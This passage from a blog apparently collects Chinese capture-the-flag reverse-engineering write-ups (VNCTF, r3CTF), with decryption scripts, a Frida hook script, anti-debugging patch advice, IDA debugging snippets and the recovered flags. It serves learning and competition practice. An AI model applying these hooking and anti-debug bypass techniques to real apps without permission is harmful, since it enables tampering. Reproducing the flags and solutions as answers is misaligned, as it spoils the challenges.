this.fish_ecode.put(&#x27;t&#x27;, &quot;jjiij&quot;);        this.fish_ecode.put(&#x27;u&#x27;, &quot;ijjji&quot;);        this.fish_ecode.put(&#x27;v&#x27;, &quot;jiiij&quot;);        this.fish_ecode.put(&#x27;w&#x27;, &quot;iiiij&quot;);        this.fish_ecode.put(&#x27;x&#x27;, &quot;iijij&quot;);        this.fish_ecode.put(&#x27;y&#x27;, &quot;jjiji&quot;);        this.fish_ecode.put(&#x27;z&#x27;, &quot;jijjj&quot;);        this.fish_ecode.put(&#x27;1&#x27;, &quot;iijjl&quot;);        this.fish_ecode.put(&#x27;2&#x27;, &quot;iiilj&quot;);        this.fish_ecode.put(&#x27;3&#x27;, &quot;iliii&quot;);        this.fish_ecode.put(&#x27;4&#x27;, &quot;jiili&quot;);        this.fish_ecode.put(&#x27;5&#x27;, &quot;jilji&quot;);        this.fish_ecode.put(&#x27;6&#x27;, &quot;iliji&quot;);        this.fish_ecode.put(&#x27;7&#x27;, &quot;jjjlj&quot;);        this.fish_ecode.put(&#x27;8&#x27;, &quot;ijljj&quot;);        this.fish_ecode.put(&#x27;9&#x27;, &quot;iljji&quot;);        this.fish_ecode.put(&#x27;0&#x27;, &quot;jjjli&quot;);    &#125;    public void decode_map() &#123;        HashMap&lt;String, Character&gt; hashMap = new HashMap&lt;&gt;();        this.fish_dcode = hashMap;        hashMap.put(&quot;iiijj&quot;, &#x27;a&#x27;);        this.fish_dcode.put(&quot;jjjii&quot;, &#x27;b&#x27;);        this.fish_dcode.put(&quot;jijij&quot;, &#x27;c&#x27;);        this.fish_dcode.put(&quot;jjijj&quot;, &#x27;d&#x27;);        this.fish_dcode.put(&quot;jjjjj&quot;, &#x27;e&#x27;);        this.fish_dcode.put(&quot;ijjjj&quot;, &#x27;f&#x27;);        this.fish_dcode.put(&quot;jjjji&quot;, &#x27;g&#x27;);        this.fish_dcode.put(&quot;iijii&quot;, &#x27;h&#x27;);        this.fish_dcode.put(&quot;ijiji&quot;, &#x27;i&#x27;);        this.fish_dcode.put(&quot;iiiji&quot;, &#x27;j&#x27;);        this.fish_dcode.put(&quot;jjjij&quot;, &#x27;k&#x27;);        this.fish_dcode.put(&quot;jijji&quot;, &#x27;l&#x27;);        this.fish_dcode.put(&quot;ijiij&quot;, &#x27;m&#x27;);        this.fish_dcode.put(&quot;iijji&quot;, &#x27;n&#x27;);        this.fish_dcode.put(&quot;ijjij&quot;, &#x27;o&#x27;);        this.fish_dcode.put(&quot;jiiji&quot;, &#x27;p&#x27;);        this.fish_dcode.put(&quot;ijijj&quot;, &#x27;q&#x27;);        this.fish_dcode.put(&quot;jijii&quot;, &#x27;r&#x27;);        this.fish_dcode.put(&quot;iiiii&quot;, &#x27;s&#x27;);        this.fish_dcode.put(&quot;jjiij&quot;, &#x27;t&#x27;);        this.fish_dcode.put(&quot;ijjji&quot;, &#x27;u&#x27;);        this.fish_dcode.put(&quot;jiiij&quot;, &#x27;v&#x27;);        this.fish_dcode.put(&quot;iiiij&quot;, &#x27;w&#x27;);        this.fish_dcode.put(&quot;iijij&quot;, &#x27;x&#x27;);        this.fish_dcode.put(&quot;jjiji&quot;, &#x27;y&#x27;);        this.fish_dcode.put(&quot;jijjj&quot;, &#x27;z&#x27;);        this.fish_dcode.put(&quot;iijjl&quot;, &#x27;1&#x27;);        this.fish_dcode.put(&quot;iiilj&quot;, &#x27;2&#x27;);        this.fish_dcode.put(&quot;iliii&quot;, &#x27;3&#x27;);        this.fish_dcode.put(&quot;jiili&quot;, &#x27;4&#x27;);        this.fish_dcode.put(&quot;jilji&quot;, &#x27;5&#x27;);        this.fish_dcode.put(&quot;iliji&quot;, &#x27;6&#x27;);        this.fish_dcode.put(&quot;jjjlj&quot;, &#x27;7&#x27;);        this.fish_dcode.put(&quot;ijljj&quot;, &#x27;8&#x27;);        this.fish_dcode.put(&quot;iljji&quot;, &#x27;9&#x27;);        this.fish_dcode.put(&quot;jjjli&quot;, &#x27;0&#x27;);    &#125;    public String encode(String str) &#123;        StringBuilder sb = new StringBuilder();        for (int i = 0; i &lt; str.length(); i++) &#123;            sb.append(this.fish_ecode.get(Character.valueOf(str.charAt(i))));        &#125;        return sb.toString();    &#125;    public String decode(String str) &#123;        StringBuilder sb = new StringBuilder();        int i = 0;        int i2 = 0;        while (i2 &lt; str.length() / 5) &#123;            int i3 = i + 5;            sb.append(this.fish_dcode.get(str.substring(i, i3)));            i2++;            i = i3;        &#125;        return sb.toString();    &#125;    public boolean check(String str) &#123;        if (str.equals(this.strr)) &#123;            return true;        &#125;        return false;    &#125;&#125;//VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;\n\nhex_str = &quot;9a9287988abfb9a3b6a978b075bda3afb274bba38c7493afa3b1bda3aa7597ac6575b0c1&quot;# 将十六进制字符串按每8字节（即16个字符）分块chunk_size = 2chunks = [hex_str[i:i+chunk_size] for i in range(0, len(hex_str), chunk_size)]# 将每个块转换为十进制并存入列表decimal_list = [int(chunk, 16) for chunk in chunks]# 打印结果print(decimal_list)print(chunks)for i in decimal_list:    print(chr(i - 68),end=&#x27;&#x27;)\n\n\nkotlindroid在SearchActivityKt初始化加密并验证flag。密文是”MTE0NTE0HMuJKLOW1BqCAi2MxpHYjGjpPq82XXQ&#x2F;jgx5WYrZ2MV53a9xjQVbRaVdRiXFrSn6EcQPzA&#x3D;&#x3D;”,iv是”114514”，加密方式是”AES&#x2F;GCM&#x2F;NoPadding”。密钥在Button$lambda$7$lambda$6方法内由两部分异或加密后拼接而成，后面传入了check函数中，hook一下就能拿到（也可以自己解）。但是没看到加密的位置，hook一下check的参数，发现输入的数据在经过sec()方法后就被加密了，查看sec方法后发现，数据被传入了SearchActivityKt$sec$1类。\n加密逻辑在SearchActivityKt$sec$1类里面，在SearchActivityKt$sec$1方法下我们可以看到，被传入的函数被作为结果函数在最后执行，并接受明文和密钥。加密逻辑在invokeSuspend()方法里。\n\n这里还用JNI.INSTANCE.getAt()方法获取了一个从so层传来的字符串并在updateAAD(bytes)中作为加密的ADD传入。之后进行AES-gcm的加密，最后再转为base64。hook一下JNI.INSTANCE.getAt()获得ADD。从题目提示得知tag也是密文的一部分。AES-GCM的密文结果一般是”iv | encrypt | tag(16bit)”。我们把密文base64解码后获取中间的密文部分。再提取tag，输入数据解密就行。\nfrom base64 import b64decodefrom Crypto.Cipher import AESkey = b&quot;atrikeyssyekirta&quot;data = &quot;MTE0NTE0HMuJKLOW1BqCAi2MxpHYjGjpPq82XXQ/jgx5WYrZ2MV53a9xjQVbRaVdRiXFrSn6EcQPzA==&quot;aad = b&quot;mysecretadd&quot;decoded_data = b64decode(data)iv = decoded_data[:6]ciphertext = decoded_data[6:-16]tag = decoded_data[-16:]enc = AES.new(key, AES.MODE_GCM, nonce=iv)enc.update(aad)flag = enc.decrypt_and_verify(ciphertext, tag)print(flag)\nhook脚本\nJava.perform(function()&#123;     let TextKt = Java.use(&quot;androidx.compose.material3.TextKt&quot;);TextKt[&quot;Text--4IGK_g&quot;].overload(&#x27;java.lang.String&#x27;, &#x27;androidx.compose.ui.Modifier&#x27;, &#x27;long&#x27;, &#x27;long&#x27;, &#x27;androidx.compose.ui.text.font.FontStyle&#x27;, &#x27;androidx.compose.ui.text.font.FontWeight&#x27;, &#x27;androidx.compose.ui.text.font.FontFamily&#x27;, &#x27;long&#x27;, &#x27;androidx.compose.ui.text.style.TextDecoration&#x27;, &#x27;androidx.compose.ui.text.style.TextAlign&#x27;, &#x27;long&#x27;, &#x27;int&#x27;, &#x27;boolean&#x27;, &#x27;int&#x27;, &#x27;int&#x27;, &#x27;kotlin.jvm.functions.Function1&#x27;, &#x27;androidx.compose.ui.text.TextStyle&#x27;, &#x27;androidx.compose.runtime.Composer&#x27;, &#x27;int&#x27;, &#x27;int&#x27;, &#x27;int&#x27;).implementation = function (text, modifier, color, fontSize, fontStyle, fontWeight, fontFamily, letterSpacing, textDecoration, textAlign, lineHeight, overflow, softWrap, maxLines, minLines, function1, style, $composer, $changed, $changed1, i) &#123;    console.log(`TextKt.m2466Text4IGK_g is called: text=$&#123;text&#125;, modifier=$&#123;modifier&#125;, color=$&#123;color&#125;, fontSize=$&#123;fontSize&#125;, fontStyle=$&#123;fontStyle&#125;, fontWeight=$&#123;fontWeight&#125;, fontFamily=$&#123;fontFamily&#125;, letterSpacing=$&#123;letterSpacing&#125;, textDecoration=$&#123;textDecoration&#125;, textAlign=$&#123;textAlign&#125;, lineHeight=$&#123;lineHeight&#125;, overflow=$&#123;overflow&#125;, softWrap=$&#123;softWrap&#125;, maxLines=$&#123;maxLines&#125;, minLines=$&#123;minLines&#125;, function1=$&#123;function1&#125;, style=$&#123;style&#125;, $composer=$&#123;$composer&#125;, $changed=$&#123;$changed&#125;, $changed1=$&#123;$changed1&#125;, i=$&#123;i&#125;`);    this[&quot;Text--4IGK_g&quot;](text, modifier, color, fontSize, fontStyle, fontWeight, fontFamily, letterSpacing, textDecoration, textAlign, lineHeight, overflow, softWrap, maxLines, minLines, function1, style, $composer, $changed, $changed1, i);&#125;;let SearchActivityKt = Java.use(&quot;com.atri.ezcompose.SearchActivityKt&quot;);SearchActivityKt[&quot;check&quot;].implementation = function (text, context, key) &#123;    console.log(`SearchActivityKt.check is called: text=$&#123;text&#125;, context=$&#123;context&#125;, key=$&#123;key&#125;`);    this[&quot;check&quot;](text, context, key);&#125;;SearchActivityKt[&quot;sec&quot;].implementation = function (context, secretKey, text, function1) &#123;    console.log(`SearchActivityKt.sec is called: context=$&#123;context&#125;, secretKey=$&#123;secretKey&#125;, text=$&#123;text&#125;, function1=$&#123;function1&#125;`);    this[&quot;sec&quot;](context, secretKey, text, function1);&#125;;SearchActivityKt[&quot;check$lambda$14&quot;].implementation = function (context, flag) &#123;    console.log(`SearchActivityKt.check$lambda$14 is called: context=$&#123;context&#125;, flag=$&#123;flag&#125;`);    let result = this[&quot;check$lambda$14&quot;](context, flag);    console.log(`SearchActivityKt.check$lambda$14 result=$&#123;result&#125;`);    return result;&#125;;let JNI = Java.use(&quot;com.atri.ezcompose.JNI&quot;);JNI[&quot;getAt&quot;].implementation = function () &#123;    console.log(`JNI.getAt is called`);    let result = this[&quot;getAt&quot;]();    console.log(`JNI.getAt result=$&#123;result&#125;`);    return result;&#125;;let Intrinsics = Java.use(&quot;kotlin.jvm.internal.Intrinsics&quot;);Intrinsics[&quot;checkNotNullExpressionValue&quot;].implementation = function (value, expression) &#123;    console.log(`Intrinsics.checkNotNullExpressionValue is called: value=$&#123;value&#125;, expression=$&#123;expression&#125;`);    this[&quot;checkNotNullExpressionValue&quot;](value, expression);&#125;;&#125;)\n\n\n幸运转盘鸿蒙逆向。用abc编译器反编译.hap解压后的etc\\modules.abc文件。被混淆了，不过不影响分析，用搜索寻找函数的声明与引用就行。\n我们可以看到一个Index页面，这是第一个界面，里面有一个#~@0&gt;@1*^d*#()方法。\n\n这里先加载了一个lib库，里面传入了一些数据，我们ctrl+f搜索一下名字就会发现_lexenv_0_1_.numX是输入数据的长度，lexenv_0_1.pw是我们输入的数据，还有一个常量24也被传入。然后把返回的结果传参传给了pages&#x2F;MyPage。\n我们来看MyPage，往下看会看到一串密文。\n\n在lexenv_0_0_ &#x3D; Uint8Array(buffer.from(lexenv_0_5.result).buffer);中我们发现_lexenv_0_5就是MyPage这个对象，从中我们获取了result这个属性并转为字符串。这就是从Index传来的参数。\n往下看ldlexvar.forEach()这个方法对我们的输入进行了一些操作，第一个是(result+1)^7，第二个就是在和_lexenv_0_1也就是密文进行比较。\n现在我们看c层对我们的输入进行的操作，ida打开libhello.so搜索MyCry，这是在调用lib库的时候传入参数的的函数。其实在你第一步解密密文时就会发现这是一个base64加密编码，也可以去字符串表找base64的表用交叉引用定位函数。\n\n有一个+3还有两个RC4魔改加密，试两次就行。估计是等于50的那个。\nimport base64def KSA(key):    &quot;&quot;&quot; Key-Scheduling Algorithm (KSA) &quot;&quot;&quot;    S = list(range(256))    j = 0    for i in range(256):        j = (j + S[i] + key[i % len(key)]) % 256        S[i], S[j] = S[j], S[i]    return Sdef PRGA(S):    &quot;&quot;&quot; Pseudo-Random Generation Algorithm (PRGA) &quot;&quot;&quot;    i, j = 0, 0    while True:        i = (i + 1) % 256        j = (j + S[i]) % 256        S[i], S[j] = S[j], S[i]        K = S[(S[i] + S[j]) % 256]        yield Kdef RC4(key, text):    &quot;&quot;&quot; RC4 encryption/decryption &quot;&quot;&quot;    S = KSA(key)    keystream = PRGA(S)    res = []    for char in text:        res.append(char ^ next(keystream))    return bytes(res)s = [101, 74, 76, 49, 101, 76, 117, 87, 55, 69, 118, 68, 118, 69, 55, 67, 61, 83, 62, 111, 81, 77, 115, 101, 53, 73, 83, 66, 68, 114, 109, 108, 75, 66, 97, 117, 93, 127, 115, 124, 109, 82, 93, 115]enc=&quot;&quot;for i in range(len(s)):    enc += chr((s[i]^7) -1)print(enc)dec = base64.b64decode(enc.encode())enc_1 = []for i in dec:    b = i ^ 0x28    enc_1.append(b)key = b&#x27;Take_it_easy&#x27;ciphertext = RC4(key, enc_1)flag = &quot;&quot;for i in ciphertext:    flag += chr(i-3)print(flag)# aLJ5aJqO/ApBpA/C9S8gUIsa1MSDBtijKDeqYwsziTYs# VNCTF&#123;JUst_$ne_Iast_dance_2025!&#125; \n\nAndroidLux程序在java层用socket与linux虚拟环境进行通信，把输入传给linux进行判断。在Init类下发现解压了assert中的env文件进行初始化，我们解压下来就可以看到linux的rootfs文件。在Service类下可以看到启动了一个服务，就是启动了一个linux虚拟环境并设置执行目录为&#x2F;root并执行了&#x2F;root下的env文件。我们在rootfs文件中找到env文件，ida打开分析。里面有些用B和B.IM构成的花指令，用E0 03 00 AA字节码修改掉。发现main函数和一个魔改的base64的加密逻辑。main函数实现了对数据的接受，进行base64编码和最后的比较。直接写出解密脚本发现解密不出。感觉是什么地方被修改了。于是我提取env文件在手机上自启linux虚拟环境运行，同时运行frida进行hook。发现输入的数据并没有被修改。这就纳闷了。那么数据的修改不在env文件里，也不再java层里，那么就在虚拟linux系统上了。\n最后看官方的文档，原来是修改了&#x2F;etc&#x2F;ld.so.preload配置文件加载了另一个so文件（参考），对read()和strcmp()做了手脚。至于怎么找到的，官方文档说用文件的修改时间对env内所有文件排序就可以看到了。\nfind . -type f -printf &quot;%T@ %p\\n&quot; | sort -nr | head -20 | cut -d&#x27; &#x27; -f2-\n\n&#x2F;etc&#x2F;ld.so.preload，里面指向的是”\\usr\\libexec\\libexec.so”，ida打开就可以看到逻辑。\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;unsigned char* base64_table = (unsigned char*)&quot;TUVWXYZabcdefghijABCDEF456789GHIJKLMNOPQRSklmnopqrstuvwxyz0123+/&quot;;unsigned char* base64_decode(unsigned char* code)&#123;    int table[] = &#123;255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 62, 255, 255, 255, 63, 58, 59, 60, 61, 23, 24, 25, 26, 27, 28, 255, 255, 255, 255, 255, 255, 255, 17, 18, 19, 20, 21, 22, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 1, 2, 3, 4, 5, 6, 255, 255, 255, 255, 255, 255, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255&#125;;    long len;    long str_len;    unsigned char* res;    int i, j;    //计算解码后的字符串长度      len = strlen((const char*)code);    //判断编码后的字符串后是否有=      if (strstr((const char*)code, &quot;==&quot;))        str_len = len / 4 * 3 - 2;    else if (strstr((const char*)code, &quot;=&quot;))        str_len = len / 4 * 3 - 1;    else        str_len = len / 4 * 3;    res = (unsigned char*)malloc(sizeof(unsigned char) * str_len + 1);    res[str_len] = &#x27;\\0&#x27;;    unsigned char a, b,c;    //以4个字符为一位进行解码      for (i = 0, j = 0; i &lt; len - 2; j += 3, i += 4)    &#123;        res[j] = (((unsigned char)table[code[i]]) &lt;&lt; 2) | (((unsigned char)table[code[i + 1]]) &amp; 3);         res[j + 1] = ((((unsigned char)table[code[i + 1]]) &amp; 0x3c) &lt;&lt; 2) | (((unsigned char)table[code[i + 2]]) &amp; 0xf);         a = (unsigned char)table[code[i + 2]];        c = a &gt;&gt; 4 &lt;&lt; 6;        b = ((unsigned char)table[code[i + 3]]);        res[j + 2] =  c|b;       &#125;    return res;&#125;int recmp(unsigned char* data) &#123;    unsigned char* tmp[100];    unsigned char tmp_a13,tmp_d13;        for (int i = 0; i &lt; 53; i++) &#123;        tmp_a13 = data[i] + 13;        tmp_d13 = data[i] - 13;        if (tmp_d13 &lt;= 64 || tmp_d13 &gt; 77) &#123;            if (tmp_a13 &lt;= 77 || tmp_a13 &gt; 90) &#123;                if (tmp_d13 &lt;= 96 || tmp_d13 &gt; 109) &#123;                    if (tmp_a13 &lt;= 109 || tmp_a13 &gt; 122) &#123;                        continue;                    &#125;                    else data[i] = tmp_a13;                &#125;                else  data[i] = tmp_d13;            &#125;            else data[i] = tmp_a13;        &#125;        else  data[i] = tmp_d13;    &#125;    return 0;&#125;int rexor(unsigned char* data) &#123;    for (int i = 0; i &lt; 53; i++) &#123;        data[i] ^= 1;    &#125;    return 0;&#125;int main() &#123;    unsigned char m[] = &quot;RPVIRN40R9PU67ue6RUH88Rgs65Bp8td8VQm4SPAT8Kj97QgVG==&quot;;        recmp(m);    for (int i = 0; i &lt; 53; i++) &#123;        printf(&quot;%c&quot;, m[i]);    &#125;    unsigned char* result = result = base64_decode(m);;        rexor(result);    printf(&quot;\\n&quot;);    for (int i = 0; i &lt; 37; i++) &#123;        printf(&quot;%c&quot;, result[i]);    &#125;    printf(&quot;\\n&quot;);    &#125;\n\n这题的逻辑是proot通过ptrace拦截系统调用，并修改调用指向虚拟环境的位置，从而在虚拟机中执行root命令。同时也限制了调试。参考\nFuko’s_starfish有些多余的东西可以pacth掉，最后有个反调试，在汇编里把判断改成jz就行。前面的游戏都可以patch一下，比如把猜数字的值改成0，贪吃蛇的分数改成0就通过。\n\n搜索字符串可以找到最终的逻辑，里面有两个aes加密。开头加载密钥，交叉引用一下可以看到密钥初始的位置。\n\n下面还有一个CheckRemoteDebuggerPresent函数，如果不处于调试，密钥异或0x17。写脚本解拿到密钥解AES即可。密文在比较的位置。\n查找srand的引用可以找到种子114514\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123;\tsrand(114514);\tfor (int i = 0; i &lt; 16; i++) &#123;\t\tint a = rand();\t\tprintf(&quot;%.2x&quot;, (a % 255)^0x17);\t&#125;\t&#125;//09e5fdeb683175b6b13b840891eb78d2\n\n密文(3D011C190BA090815F672731A89AA47497362167AB2EB4A09418D37D93E646E7)\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2025 r3CTF Re-部分复现","url":"/2025/07/10/r3ctf2025/","content":"r3loads直接看加密函数sub_1630。\n在ida中通过动调，进入到运算函数中，给加密函数中涉及到对输入字符进行操作的操作符下条件断点，打印操作，这样的操作大概有好几种。\n当然也可以用capstone之类的看汇编理解。\npow: 乘方import ida_dbga = ida_dbg.get_reg_val(&quot;edi&quot;)b = ida_dbg.get_reg_val(&quot;esi&quot;)print(f&quot;&#123;hex(a)&#125; ** &#123;hex(b)&#125; == &#123;hex((a**b) &amp;0xffffffff)&#125;&quot;)equl_add: 加等于import ida_dbga = ida_dbg.get_reg_val(&quot;edx&quot;)b = ida_dbg.get_reg_val(&quot;esi&quot;)print(f&quot;&#123;hex(a)&#125; += &#123;hex(b)&#125; == &#123;hex((a+b) &amp;0xffffffff)&#125;&quot;)#print(f&quot;&#123;hex(b)&#125;, &quot;,end=&#x27;&#x27;)not: 取反import ida_dbga = ida_dbg.get_reg_val(&quot;eax&quot;)print(f&quot;~&#123;hex(a)&#125; == &#123;hex((~a) &amp;0xffffffff)&#125;&quot;)box: 取值import ida_dbga = ida_dbg.get_reg_val(&quot;rax&quot;)b = ida_dbg.get_reg_val(&quot;esi&quot;)addr = (a+((b&lt;&lt;2)&amp;0xffffffff)) &amp;0xffffffffffffffffboxdata = ida_bytes.get_dword(addr)print(f&quot;*(&#123;hex(a)&#125; + (&#123;hex(b)&#125; &lt;&lt; 2)) == &#123;hex(boxdata)&#125;&quot;)or: 或import ida_dbga = ida_dbg.get_reg_val(&quot;edi&quot;)b = ida_dbg.get_reg_val(&quot;esi&quot;)print(f&quot;&#123;hex(a)&#125; | &#123;hex(b)&#125; == &#123;hex((a|b) &amp;0xffffffff)&#125;&quot;)add: 加import ida_dbga = ida_dbg.get_reg_val(&quot;edi&quot;)b = ida_dbg.get_reg_val(&quot;esi&quot;)print(f&quot;&#123;hex(a)&#125; + &#123;hex(b)&#125; == &#123;hex((a+b) &amp;0xffffffff)&#125;&quot;)and: 与import ida_dbga = ida_dbg.get_reg_val(&quot;edi&quot;)b = ida_dbg.get_reg_val(&quot;esi&quot;)print(f&quot;&#123;hex(a)&#125; &amp; &#123;hex(b)&#125; == &#123;hex((a&amp;b) &amp;0xffffffff)&#125;&quot;)div: 除import ida_dbga = ida_dbg.get_reg_val(&quot;rdi&quot;)b = ida_dbg.get_reg_val(&quot;rsi&quot;)print(f&quot;&#123;hex(a)&#125; / &#123;hex(b)&#125; == &#123;hex((a//b) &amp;0xffffffff)&#125;&quot;)mul: 乘import ida_dbga = ida_dbg.get_reg_val(&quot;edi&quot;)b = ida_dbg.get_reg_val(&quot;esi&quot;)print(f&quot;&#123;hex(a)&#125; * &#123;hex(b)&#125; == &#123;hex((a*b) &amp;0xffffffff)&#125;&quot;)xor: 异或import ida_dbga = ida_dbg.get_reg_val(&quot;edi&quot;)b = ida_dbg.get_reg_val(&quot;esi&quot;)print(f&quot;&#123;hex(a)&#125; ^ &#123;hex(b)&#125; == &#123;hex((a^b)&amp;0xffffffff)&#125;&quot;)\n\n\n为了看清的方便调试，也可以动调把函数全部重命名。\n打印全部操作\nbufl = 0x64636261  bufr = 0x68676665 0x0 &amp; 0x3 == 0x00xe738364f + 0x4db280ef == 0x34eab73e0x71dacd7 | 0xc09a2b7c == 0xc79fafff0x59a346e2 &amp; 0x3a59d43d == 0x180144200x2d65ec8d * 0xb56e09ec == 0xc4dd06fc0xc6b3c818 ^ 0x80055085 == 0x46b6989d0xf6d37e0b + 0x3de82e3d == 0x34bbac480xa02024b1 + 0xe68a261e == 0x86aa4acf0xc24ec071 ^ 0x6c7d3339 == 0xae33f348~0xae15c1b4 == 0x51ea3e4b0xa03e720e ^ 0xe9ee0919 == 0x49d07b170x2aa09b28 ^ 0xfa8a8047 == 0xd02a1b6f0xc87308ab &amp; 0x744d58ab == 0x404108ab0x91e55a57 * 0xfc368e81 == 0x6f08c7d70x6f08c7d7 | 0x404108ab == 0x6f49cfff0x6f49cfff * 0x49d07b17 == 0x2cc134e90x2cc134e9 ^ 0xae33f348 == 0x82f2c7a10x82f2c7a1 * 0x34bbac48 == 0x79035148~0x79035148 == 0x86fcaeb70x86fcaeb7 &amp; 0xc79fafff == 0x869caeb70xe738364f + 0x4db280ef == 0x34eab73e0x71dacd7 | 0xc09a2b7c == 0xc79fafff0x59a346e2 &amp; 0x3a59d43d == 0x180144200x2d65ec8d * 0xb56e09ec == 0xc4dd06fc0xc6b3c818 ^ 0x80055085 == 0x46b6989d0xf6d37e0b + 0x3de82e3d == 0x34bbac480xa02024b1 + 0xe68a261e == 0x86aa4acf0xc24ec071 ^ 0x6c7d3339 == 0xae33f348~0xae15c1b4 == 0x51ea3e4b0xa03e720e ^ 0xe9ee0919 == 0x49d07b170x2aa09b28 ^ 0xfa8a8047 == 0xd02a1b6f0xc87308ab &amp; 0x744d58ab == 0x404108ab0x91e55a57 * 0xfc368e81 == 0x6f08c7d70x6f08c7d7 | 0x404108ab == 0x6f49cfff0x6f49cfff * 0x49d07b17 == 0x2cc134e90x2cc134e9 ^ 0xae33f348 == 0x82f2c7a10x82f2c7a1 * 0x34bbac48 == 0x79035148~0x79035148 == 0x86fcaeb70x86fcaeb7 &amp; 0xc79fafff == 0x869caeb70x869caeb7 / 0x7 == 0x133af4630x133af463 * 0x7 == 0x869caeb50x2 ** 0x3 == 0x80x68676665 * 0x8 == 0x433b3328  ; bufr &lt;&lt; 30xf806c191 | 0x357f1842 == 0xfd7fd9d30x82b97bbf | 0x48ea9c2e == 0xcafbffbf~0x6c5c3899 == 0x93a3c766~0x3f921364 == 0xc06dec9b0xac507667 * 0x520c4bee == 0x505240c20x537759c1 &amp; 0x42384d31 == 0x423049010x816ad1fb &amp; 0x8b43c7f == 0x20107b0x6a6ea4a3 + 0x58bc5155 == 0xc32af5f80x971c993e * 0x9fc7adf == 0x49f909020x49f90902 &amp; 0xc32af5f8 == 0x412801000x41280100 &amp; 0x42304901 == 0x402001000x40200100 | 0xc06dec9b == 0xc06ded9b~0xc06ded9b == 0x3f9212640xf806c191 | 0x357f1842 == 0xfd7fd9d30x82b97bbf | 0x48ea9c2e == 0xcafbffbf~0x6c5c3899 == 0x93a3c766~0x3f921364 == 0xc06dec9b0xac507667 * 0x520c4bee == 0x505240c20x537759c1 &amp; 0x42384d31 == 0x423049010x816ad1fb &amp; 0x8b43c7f == 0x20107b0x6a6ea4a3 + 0x58bc5155 == 0xc32af5f80x971c993e * 0x9fc7adf == 0x49f909020x49f90902 &amp; 0xc32af5f8 == 0x412801000x41280100 &amp; 0x42304901 == 0x402001000x40200100 | 0xc06dec9b == 0xc06ded9b~0xc06ded9b == 0x3f9212640x3f921264 / 0x7 == 0x914de0e0x914de0e * 0x7 == 0x3f9212620x2 ** 0x3 == 0x80x68676665 / 0x8 == 0xd0ceccc  ; bufr &gt;&gt; 37FFFF7F37000: loaded /home/huanghunr/game/1/RRRRRRRRRRRRRRRRRRR3RR3RR333R3R3.so7FFFF7F32000: loaded /home/huanghunr/game/1/RRRRRRRRRRRRRRRRRRR3RR3RR333R333.so7FFFF7F2D000: loaded /home/huanghunr/game/1/RRRRRRRRRRRRRRRRRRR3RR3RR3333RR3.so*(0x7fffffffcd50 + (0x0 &lt;&lt; 2)) == 0xae ;sbox[0]0xae + 0x0 == 0xae  ;sbox[] +sum 0x433b3328 ^ 0xd0ceccc == 0x4e37dfe4  ;((bufr &lt;&lt;3) ^ (bufr &gt;&gt;3))0x4e37dfe4 + 0x68676665 == 0xb69f4649 ;((bufr &lt;&lt;3) ^ (bufr &gt;&gt;3)) +bufr~0xae == 0xffffff51  ;~(sbox[] + sum) 0xffffff51 &amp; 0xb69f4649 == 0xb69f4641  ;~(sbox[] + sum) &amp; 0xb69f4649~0xb69f4649 == 0x4960b9b60x4960b9b6 &amp; 0xae == 0xa6 ;(sbox[] + sum) &amp; (~0xb69f4649)0xa6 | 0xb69f4641 == 0xb69f46e7 ;a ^ b (a ^ b == (~a &amp; b) | (a &amp; ~b))7FFFF7F28000: loaded /home/huanghunr/game/1/RRRRRRRRRRRRRRRRRRRR33333RRRR3R3.so0x64636261 += 0xb69f46e7 == 0x1b02a9480x33607b55 | 0xde4cad13 == 0xff6cff570x3c8c0c29 | 0xac64ce6a == 0xbcecce6b~0x82e95826 == 0x7d16a7d9~0xfe7c8c50 == 0x18373af0xeb28aa82 * 0x7eae9b59 == 0x40bbfd320xde6bf394 ^ 0xd8050cf == 0xd3eba35b0x88f767a6 | 0x6ef9c61c == 0xeeffe7be0x83ff169b ^ 0xfe4cd3ff == 0x7db3c5640xfdcb82ad ^ 0x3950fe46 == 0xc49b7ceb0xfee6b1d1 + 0x1e967492 == 0x1d7d26630xa09a1807 + 0xa551f72c == 0x45ec0f330x45ec0f33 + 0x1d7d2663 == 0x636935960x63693596 + 0x7db3c564 == 0xe11cfafa0xe11cfafa * 0xd3eba35b == 0xea9864de0xea9864de &amp; 0x18373af == 0x80608e0x80608e &amp; 0xbcecce6b == 0x80400a0x33607b55 | 0xde4cad13 == 0xff6cff570x3c8c0c29 | 0xac64ce6a == 0xbcecce6b~0x82e95826 == 0x7d16a7d9~0xfe7c8c50 == 0x18373af0xeb28aa82 * 0x7eae9b59 == 0x40bbfd320xde6bf394 ^ 0xd8050cf == 0xd3eba35b0x88f767a6 | 0x6ef9c61c == 0xeeffe7be0x83ff169b ^ 0xfe4cd3ff == 0x7db3c5640xfdcb82ad ^ 0x3950fe46 == 0xc49b7ceb0xfee6b1d1 + 0x1e967492 == 0x1d7d26630xa09a1807 + 0xa551f72c == 0x45ec0f330x45ec0f33 + 0x1d7d2663 == 0x636935960x63693596 + 0x7db3c564 == 0xe11cfafa0xe11cfafa * 0xd3eba35b == 0xea9864de0xea9864de &amp; 0x18373af == 0x80608e0x80608e &amp; 0xbcecce6b == 0x80400a0x80400a / 0x7 == 0x12524a0x12524a * 0x7 == 0x8040060x2 ** 